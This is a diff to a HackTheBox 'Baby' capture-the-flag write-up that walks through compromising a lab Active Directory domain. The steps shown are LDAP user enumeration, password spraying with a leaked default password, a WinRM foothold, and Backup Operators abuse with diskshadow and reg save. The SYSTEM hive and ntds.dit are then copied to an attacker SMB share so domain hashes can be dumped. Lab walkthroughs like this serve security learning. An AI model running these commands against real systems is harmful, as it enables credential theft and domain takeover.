@@ -1,5 +1,7 @@
 # [HackTheBox - Baby](https://app.hackthebox.com/machines/Baby)
+
 ![c6f135fd23e08499dbcf0bcab8d08564.png](/resources/c6f135fd23e08499dbcf0bcab8d08564.png)
+
 ## Table of Contents
 
 - [Abstract](#abstract)
@@ -26,9 +28,11 @@ nmap $IP
 ![26b7efdc620353a2086c3d852c4da222.png](/resources/26b7efdc620353a2086c3d852c4da222.png)
 
 I rescanned again with `-sCV` flag for service enumeration and nmap script engine which reveals domain and hostname that we can add to hosts file but other information are not too special at this point  
+
 ![ff14d3ebf97cfed092a71494342ed65e.png](/resources/ff14d3ebf97cfed092a71494342ed65e.png)
 
 After adding domain to hosts file. I started enumerate SMB with NetExec tool and we can see that null session could not be used to retrieve anything from  
+
 ![f1d4e9c963c1fed550ace9ded12fa705.png](/resources/f1d4e9c963c1fed550ace9ded12fa705.png)
 
 But after changing protocol to LDAP, we can see that we can pull user lists from the domain and we can also see that we also have a password from user description and it telling us that the initial password of users on this domain is "BabyStart123!" and will likely to be changed after user logon.
@@ -43,6 +47,7 @@ nxc ldap baby.vl -u '' -p '' --users-export baby_users.txt
 nxc smb baby.vl -u baby_users.txt -p 'BabyStart123!'
 ```
 ![2ac46c2fab4c297d6944f279690dca56.png](/resources/2ac46c2fab4c297d6944f279690dca56.png)
+
 ![81e4fe894bd107521a7ac680c1790ab4.png](/resources/81e4fe894bd107521a7ac680c1790ab4.png)
 
 I used a simple LDAP search to search for something I might have missed and sure enough, there is one user that could not be pulled with my netexec 
@@ -72,6 +77,7 @@ uv run nxc smb baby.vl -u 'Caroline.Robinson' -p 'BabyStart123!' -M change-passw
 ![0eef906aa335b4004f160937bb3d3f2a.png](/resources/0eef906aa335b4004f160937bb3d3f2a.png)
 
 Now we can use this account to eneumerate further but nothing too special on share here.
+
 ![d184b24b122d32a5e684378c0e132b6c.png](/resources/d184b24b122d32a5e684378c0e132b6c.png)
 
 We can use this user to gain a foothold as we can see "Pwn3d!" message from NetExec with WinRM protocol 
@@ -81,6 +87,7 @@ nxc winrm baby.vl -u 'Caroline.Robinson' -p Password123
 ![2316cf50ce55d71714b1dbc3a8672b7a.png](/resources/2316cf50ce55d71714b1dbc3a8672b7a.png)
 
 Using [evil-winrm](https://github.com/Hackplayers/evil-winrm), we can gain a foothold and loot user flag located on the desktop of this user.
+
 ![495cb95b3a45b41f28535d9e863c6a69.png](/resources/495cb95b3a45b41f28535d9e863c6a69.png)
 
 ## Privilege Escalation with Backup Operators group
@@ -118,6 +125,7 @@ upload diskshadow.txt
 diskshadow /s diskshadow.txt
 ```
 ![ce09650189645b3ef5b09f67aa5bdea4.png](/resources/ce09650189645b3ef5b09f67aa5bdea4.png)
+
 ![2c89cee29b28fb4bd2358de6f21a5210.png](/resources/2c89cee29b28fb4bd2358de6f21a5210.png)
 
 Since SYSTEM hive and ntds.dit files are quite large so, I opened my netshare share and copy both files to my Kali Linux. This way is much faster than download function in evil-winrm. first I created a backup of SYSTEM hive with reg save command.
@@ -126,6 +134,7 @@ reg save hklm\system c:\system
 cp system.hive \\10.10.14.24\debug\
 ```
 ![1b2ada0a9d181e68400962ee83cc16a9.png](/resources/1b2ada0a9d181e68400962ee83cc16a9.png)
+
 ![985f2bfdcd10aa66d3ae23d309d8a909.png](/resources/985f2bfdcd10aa66d3ae23d309d8a909.png)
 
 Next is ntds.dit file and now we are ready to dump all the hashes inside both files.
